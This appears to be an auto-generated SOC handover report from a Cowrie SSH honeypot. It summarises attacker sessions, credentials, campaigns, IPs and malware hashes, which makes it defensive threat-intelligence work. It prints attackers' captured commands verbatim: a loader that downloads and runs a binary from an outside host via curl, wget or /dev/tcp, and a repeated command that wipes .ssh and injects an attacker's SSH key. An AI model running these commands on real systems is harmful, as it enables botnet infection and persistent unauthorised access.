# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-31 |
| **Generated At** | 2026-03-31T16:55:49Z |
| **Shift Time** | 16:55 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **106** |
| Confirmed Threats | **73** |
| False Positives Filtered | **33** (31.1%) |
| Unique Attacker IPs | **42** |
| Countries of Origin | **17** |
| High Severity Cases | **10** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **96** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **38** |
| Unique Credential Pairs | **27** |
| Unique Usernames | **19** |
| Unique Passwords | **25** |
| Successful Auth Pairs | **10** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 10 |
| `345gs5662d34` | 4 |
| `GET / HTTP/1.1` | 3 |
| `Accept-Encoding: gzip` | 3 |
| `Default` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 4 |
| `3245gs5662d34` | 4 |
| `Host: 13.235.92.17:23` | 3 |
| `Accept: */*` | 3 |
| `` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `3245gs5662d34` | 4 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 3 |
| `Accept-Encoding: gzip` | `` | 3 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | `Accept: */*` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Aa@123456` | `8.138.224.17` | 2026-03-31T15:05:57 |
| `root` | `toor` | `154.125.184.240` | 2026-03-31T15:47:39 |
| `root` | `6tfc^TFC` | `222.232.176.7` | 2026-03-31T15:57:37 |
| `root` | `3245gs5662d34` | `222.232.176.7` | 2026-03-31T15:57:40 |
| `root` | `1234rewq` | `186.251.71.202` | 2026-03-31T15:59:17 |
| `root` | `3245gs5662d34` | `186.251.71.202` | 2026-03-31T15:59:25 |
| `root` | `1234Qwert` | `185.228.135.197` | 2026-03-31T16:26:30 |
| `root` | `3245gs5662d34` | `185.228.135.197` | 2026-03-31T16:26:35 |
| `root` | `china35.net` | `51.163.39.213` | 2026-03-31T16:32:28 |
| `root` | `3245gs5662d34` | `51.163.39.213` | 2026-03-31T16:32:32 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
sh
```
```
shell
```
```
enable
```
```
system
```
```
/bin/busybox BOT
```
Source IPs: `154.125.184.240`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `222.232.176.7`, `186.251.71.202`, `51.163.39.213`, `185.228.135.197`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **42** |
| Unique ASNs | **35** |
| High-Risk ASNs | **27** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS3301` | Telia Company AB | 2 | HIGH |
| `AS141452` | Jhongkar IT | 2 | LOW |
| `AS9318` | SK Broadband Co Ltd | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS15830` | Equinix (EMEA) Acquisition Enterprises B.V. | 1 | HIGH |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (9)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-5d77cf93fa2f

| Field | Detail |
|---|---|
| **Source IP** | `8.138.224[.]17` |
| **First Seen** | 2026-03-31 15:05 |
| **Last Seen** | 2026-03-31 15:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 1 > /dev/null && cat /bin/echo, nohup $SHELL -c "curl hxxp://47.76.210[.]137:60115/arm_linux -o /tmp/dWS8CQoA6i; if [ ! -f /tmp/dWS8CQoA6i ]; then wget hxxp://47.76.210[.]137:60115/arm_linux -O /tmp/dWS8CQoA6i; fi; if [ ! -f /tmp/dWS8CQoA6i ]; then exec 6<>/dev/tcp/47.76.210[.]137/60115 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/dWS8CQoA6i ; chmod +x /tmp/dWS8CQoA6i && /tmp/dWS8CQoA6i iY3le2VTly6UVmN77Jj0/pvtZGZQhTSST2Vg6YP19pvzbG5bkzCUUWd16Z7q9pnle2BZizGcUG1j7Zz19I3pYnlTljeLWWF77JXy/pvtZGNWhTSST2Vh7oP19przZGNRnzaVUGNm/Znz6p/ubHlVly6XUG, head -c 2639612 > /tmp/wES1dB9aaE, nohup $SHELL -c "curl hxxp://47.76.210[.]137:60115/arm_linux -o /tmp/dWS8CQoA6i; if [ ! -f /tmp/dWS8CQoA6i ]; then wget hxxp://47.76.210[.]137:60115/arm_linux -O /tmp/dWS8CQoA6i; fi; if [ ! -f /tmp/dWS8CQoA6i ]; then exec 6<>/dev/tcp/47.76.210[.]137/60115 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/dWS8CQoA6i ; chmod +x /tmp/dWS8CQoA6i && /tmp/dWS8CQoA6i iY3le2VTly6UVmN77Jj0/pvtZGZQhTSST2Vg6YP19pvzbG5bkzCUUWd16Z7q9pnle2BZizGcUG1j7Zz19I3pYnlTljeLWWF77JXy/pvtZGNWhTSST2Vh7oP19przZGNRnzaVUGNm/Znz6p/ubHlVly6XUG, (vXZXELF` |
| **TTPs (MITRE)** | T1078 · T1083 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 15:05:56` | `cowrie.session.connect` |
| `2026-03-31 15:05:56` | `cowrie.client.version` |
| `2026-03-31 15:05:56` | `cowrie.client.kex` |
| `2026-03-31 15:05:57` | `cowrie.login.success` |
| `2026-03-31 15:05:57` | `cowrie.session.params` |
| `2026-03-31 15:05:57` | `cowrie.command.input` |
| `2026-03-31 15:06:00` | `cowrie.command.input` |
| `2026-03-31 15:06:00` | `cowrie.command.input` |
| `2026-03-31 15:06:01` | `cowrie.command.input` |
| `2026-03-31 15:06:01` | `cowrie.command.input` |
| `2026-03-31 15:06:01` | `cowrie.log.closed` |
| `2026-03-31 15:06:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.138.224[.]17` to AbuseIPDB if not already reported
- [ ] Block `8.138.224[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d13b1f3d8da7

| Field | Detail |
|---|---|
| **Source IP** | `222.232.176[.]7` |
| **First Seen** | 2026-03-31 15:57 |
| **Last Seen** | 2026-03-31 15:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 15:57:36` | `cowrie.session.connect` |
| `2026-03-31 15:57:36` | `cowrie.client.version` |
| `2026-03-31 15:57:36` | `cowrie.client.kex` |
| `2026-03-31 15:57:37` | `cowrie.login.success` |
| `2026-03-31 15:57:37` | `cowrie.session.params` |
| `2026-03-31 15:57:37` | `cowrie.command.input` |
| `2026-03-31 15:57:37` | `cowrie.command.failed` |
| `2026-03-31 15:57:37` | `cowrie.log.closed` |
| `2026-03-31 15:57:37` | `cowrie.session.params` |
| `2026-03-31 15:57:37` | `cowrie.command.input` |
| `2026-03-31 15:57:37` | `cowrie.session.file_download` |
| `2026-03-31 15:57:37` | `cowrie.log.closed` |
| `2026-03-31 15:57:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.232.176[.]7` to AbuseIPDB if not already reported
- [ ] Block `222.232.176[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7a2be493a93

| Field | Detail |
|---|---|
| **Source IP** | `222.232.176[.]7` |
| **First Seen** | 2026-03-31 15:57 |
| **Last Seen** | 2026-03-31 15:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 15:57:40` | `cowrie.session.connect` |
| `2026-03-31 15:57:40` | `cowrie.client.version` |
| `2026-03-31 15:57:40` | `cowrie.client.kex` |
| `2026-03-31 15:57:40` | `cowrie.login.success` |
| `2026-03-31 15:57:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.232.176[.]7` to AbuseIPDB if not already reported
- [ ] Block `222.232.176[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29f015ea7b37

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-03-31 15:59 |
| **Last Seen** | 2026-03-31 15:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 15:59:16` | `cowrie.session.connect` |
| `2026-03-31 15:59:16` | `cowrie.client.version` |
| `2026-03-31 15:59:16` | `cowrie.client.kex` |
| `2026-03-31 15:59:17` | `cowrie.login.success` |
| `2026-03-31 15:59:18` | `cowrie.session.params` |
| `2026-03-31 15:59:18` | `cowrie.command.input` |
| `2026-03-31 15:59:18` | `cowrie.command.failed` |
| `2026-03-31 15:59:18` | `cowrie.log.closed` |
| `2026-03-31 15:59:19` | `cowrie.session.params` |
| `2026-03-31 15:59:19` | `cowrie.command.input` |
| `2026-03-31 15:59:20` | `cowrie.session.file_download` |
| `2026-03-31 15:59:20` | `cowrie.log.closed` |
| `2026-03-31 15:59:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-700ec9dfe4ad

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-03-31 15:59 |
| **Last Seen** | 2026-03-31 15:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 15:59:23` | `cowrie.session.connect` |
| `2026-03-31 15:59:23` | `cowrie.client.version` |
| `2026-03-31 15:59:24` | `cowrie.client.kex` |
| `2026-03-31 15:59:25` | `cowrie.login.success` |
| `2026-03-31 15:59:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-906631dfd725

| Field | Detail |
|---|---|
| **Source IP** | `185.228.135[.]197` |
| **First Seen** | 2026-03-31 16:26 |
| **Last Seen** | 2026-03-31 16:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 16:26:30` | `cowrie.session.connect` |
| `2026-03-31 16:26:30` | `cowrie.client.version` |
| `2026-03-31 16:26:30` | `cowrie.client.kex` |
| `2026-03-31 16:26:30` | `cowrie.login.success` |
| `2026-03-31 16:26:31` | `cowrie.session.params` |
| `2026-03-31 16:26:31` | `cowrie.command.input` |
| `2026-03-31 16:26:31` | `cowrie.command.failed` |
| `2026-03-31 16:26:31` | `cowrie.log.closed` |
| `2026-03-31 16:26:32` | `cowrie.session.params` |
| `2026-03-31 16:26:32` | `cowrie.command.input` |
| `2026-03-31 16:26:32` | `cowrie.session.file_download` |
| `2026-03-31 16:26:32` | `cowrie.log.closed` |
| `2026-03-31 16:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.228.135[.]197` to AbuseIPDB if not already reported
- [ ] Block `185.228.135[.]197` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-218ae009c5ac

| Field | Detail |
|---|---|
| **Source IP** | `185.228.135[.]197` |
| **First Seen** | 2026-03-31 16:26 |
| **Last Seen** | 2026-03-31 16:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 16:26:34` | `cowrie.session.connect` |
| `2026-03-31 16:26:34` | `cowrie.client.version` |
| `2026-03-31 16:26:34` | `cowrie.client.kex` |
| `2026-03-31 16:26:35` | `cowrie.login.success` |
| `2026-03-31 16:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.228.135[.]197` to AbuseIPDB if not already reported
- [ ] Block `185.228.135[.]197` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-878be7dfac74

| Field | Detail |
|---|---|
| **Source IP** | `51.163.39[.]213` |
| **First Seen** | 2026-03-31 16:32 |
| **Last Seen** | 2026-03-31 16:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 16:32:28` | `cowrie.session.connect` |
| `2026-03-31 16:32:28` | `cowrie.client.version` |
| `2026-03-31 16:32:28` | `cowrie.client.kex` |
| `2026-03-31 16:32:28` | `cowrie.login.success` |
| `2026-03-31 16:32:29` | `cowrie.session.params` |
| `2026-03-31 16:32:29` | `cowrie.command.input` |
| `2026-03-31 16:32:29` | `cowrie.command.failed` |
| `2026-03-31 16:32:29` | `cowrie.log.closed` |
| `2026-03-31 16:32:29` | `cowrie.session.params` |
| `2026-03-31 16:32:29` | `cowrie.command.input` |
| `2026-03-31 16:32:29` | `cowrie.session.file_download` |
| `2026-03-31 16:32:29` | `cowrie.log.closed` |
| `2026-03-31 16:32:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.163.39[.]213` to AbuseIPDB if not already reported
- [ ] Block `51.163.39[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7da6967c9d70

| Field | Detail |
|---|---|
| **Source IP** | `51.163.39[.]213` |
| **First Seen** | 2026-03-31 16:32 |
| **Last Seen** | 2026-03-31 16:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 16:32:31` | `cowrie.session.connect` |
| `2026-03-31 16:32:31` | `cowrie.client.version` |
| `2026-03-31 16:32:31` | `cowrie.client.kex` |
| `2026-03-31 16:32:32` | `cowrie.login.success` |
| `2026-03-31 16:32:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.163.39[.]213` to AbuseIPDB if not already reported
- [ ] Block `51.163.39[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `223.123.38[.]36` | **25** | 2026-03-31 16:00 | 2026-03-31 16:06 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `16.58.56[.]214` | **4** | 2026-03-31 16:30 | 2026-03-31 16:34 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `47.76.130[.]255` | **3** | 2026-03-31 15:48 | 2026-03-31 15:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `64.227.108[.]146` | **2** | 2026-03-31 16:37 | 2026-03-31 16:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `100.2.219[.]251` | 1 | 2026-03-31 16:51 | 2026-03-31 16:51 | 31s | 0 | `T1592` | 🟢 LOW |
| `112.86.146[.]178` | 1 | 2026-03-31 16:24 | 2026-03-31 16:24 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.190.188[.]245` | 1 | 2026-03-31 15:18 | 2026-03-31 15:19 | 61s | 0 | `T1592` | 🟢 LOW |
| `115.191.14[.]114` | 1 | 2026-03-31 15:16 | 2026-03-31 15:16 | 10s | 0 | `T1592` | 🟢 LOW |
| `118.34.180[.]142` | 1 | 2026-03-31 15:07 | 2026-03-31 15:08 | 13s | 0 | `T1592` | 🟢 LOW |
| `120.230.180[.]244` | 1 | 2026-03-31 15:09 | 2026-03-31 15:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `128.199.118[.]234` | 1 | 2026-03-31 15:30 | 2026-03-31 15:30 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.103.119[.]98` | 1 | 2026-03-31 15:00 | 2026-03-31 15:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.184.176[.]74` | 1 | 2026-03-31 15:06 | 2026-03-31 15:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.189.81[.]2` | 1 | 2026-03-31 15:15 | 2026-03-31 15:15 | 12s | 0 | `T1592` | 🟢 LOW |
| `180.76.104[.]208` | 1 | 2026-03-31 16:50 | 2026-03-31 16:50 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.156.80[.]11` | 1 | 2026-03-31 15:10 | 2026-03-31 15:10 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.247.171[.]186` | 1 | 2026-03-31 15:50 | 2026-03-31 15:50 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.2.228[.]48` | 1 | 2026-03-31 16:30 | 2026-03-31 16:30 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.228.135[.]197` | 1 | 2026-03-31 16:26 | 2026-03-31 16:26 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.251.71[.]202` | 1 | 2026-03-31 15:59 | 2026-03-31 15:59 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `189.52.52[.]162` | 1 | 2026-03-31 16:10 | 2026-03-31 16:10 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `213.65.190[.]48` | 1 | 2026-03-31 16:27 | 2026-03-31 16:27 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `219.248.65[.]30` | 1 | 2026-03-31 16:05 | 2026-03-31 16:05 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.232.176[.]7` | 1 | 2026-03-31 15:57 | 2026-03-31 15:57 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-03-31 15:35 | 2026-03-31 15:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `46.225.75[.]48` | 1 | 2026-03-31 15:25 | 2026-03-31 15:25 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `51.163.39[.]213` | 1 | 2026-03-31 16:32 | 2026-03-31 16:32 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.164.252[.]244` | 1 | 2026-03-31 15:01 | 2026-03-31 15:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `65.20.158[.]10` | 1 | 2026-03-31 15:05 | 2026-03-31 15:05 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.204[.]131` | 1 | 2026-03-31 15:45 | 2026-03-31 15:45 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.204[.]179` | 1 | 2026-03-31 15:07 | 2026-03-31 15:08 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `90.173.78[.]90` | 1 | 2026-03-31 16:46 | 2026-03-31 16:46 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `90.230.212[.]29` | 1 | 2026-03-31 16:07 | 2026-03-31 16:07 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `93.123.109[.]222` | 1 | 2026-03-31 16:25 | 2026-03-31 16:25 | 0s | 3 | `T1110.001` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
